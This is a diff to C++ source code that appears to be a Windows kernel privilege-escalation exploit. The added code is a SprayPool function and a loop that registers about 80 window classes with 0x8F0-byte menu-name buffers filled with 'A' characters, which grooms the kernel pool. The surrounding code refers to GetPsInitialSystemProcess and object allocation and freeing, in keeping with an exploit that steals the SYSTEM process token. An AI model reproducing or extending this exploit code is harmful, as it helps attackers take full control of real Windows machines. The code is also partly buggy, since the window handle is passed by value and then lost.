@@ -162,6 +162,20 @@ GetPsInitialSystemProcess(
 	return (DWORD64)Psi;
 }
 
+VOID
+SprayPool(
+	__in    LPCWSTR classNumber,
+	__inout WNDCLASSEX wnd,
+	__out   HWND hWnd
+)
+{
+
+	HINSTANCE hInst = GetModuleHandleA(NULL);
+	auto hCls = RegisterClassExW(&wnd);
+	hWnd = CreateWindowExW(0, classNumber, NULL, NULL, 0, 0, NULL, NULL, 0, 0, hInst, 0);
+	
+}
+
 ULONGLONG
 RegisterCls(
 	__in    LPCWSTR classNumber,
@@ -248,6 +262,23 @@ AllocFreeObjects(
 	ULONGLONG plpszMenuName;
 	wchar_t buffer[256];
 	int classNumber = 0;
+	
+	for (int h = 0; h <= 80; h++) {
+		wsprintfW(buffer, L"%d", classNumber);
+		WNDCLASSEX wnd = { 0x0 };
+		wnd.cbSize = sizeof(wnd);
+		wnd.lpszClassName = buffer;
+		wnd.lpfnWndProc = MainWProc;
+		WCHAR* Buff = new WCHAR[0x8F0];
+		RtlSecureZeroMemory(Buff, 0x8F0);
+		RtlFillMemory(Buff, 0x8F0, '\x41');
+		//printf("\tallocated WndCls size is: %p\n",  0x8f0);
+		wnd.lpszMenuName = Buff;
+		//printf("%d\n", classNumber);
+		//__debugbreak();
+		SprayPool(buffer, wnd, hWnd);
+	}
+	
 	while (1){
 			wsprintfW(buffer, L"%d", classNumber);
 			WNDCLASSEX wnd = { 0x0 };
